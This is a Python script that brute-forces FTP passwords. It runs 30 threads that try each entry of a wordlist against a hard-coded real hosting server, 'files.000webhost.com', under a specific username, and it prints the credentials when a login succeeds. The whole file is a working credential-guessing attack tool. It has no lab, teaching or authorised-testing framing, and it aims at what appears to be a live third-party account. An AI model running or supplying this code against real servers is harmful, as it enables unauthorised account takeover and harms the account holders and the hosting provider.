import ftplib
from threading import Thread
import queue
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
# init()
# initialize the queue
q = queue.Queue()
# number of threads to spawn
n_threads = 30
# hostname or IP address of the FTP server
host = "files.000webhost.com"
# username of the FTP server, root as default for linux
user = "hehemdr"
# port of FTP, aka 21
port = 21

def connect_ftp():
    global q
    while True:
        # get the password from the queue
        password = q.get()
        # initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            q.task_done()

# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:", len(passwords))
# put all passwords to the queue
for password in passwords:
    q.put(password)
# create `n_threads` that runs that function
for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    # will end when the main thread end
    thread.daemon = True
    thread.start()
# wait for the queue to be empty
q.join()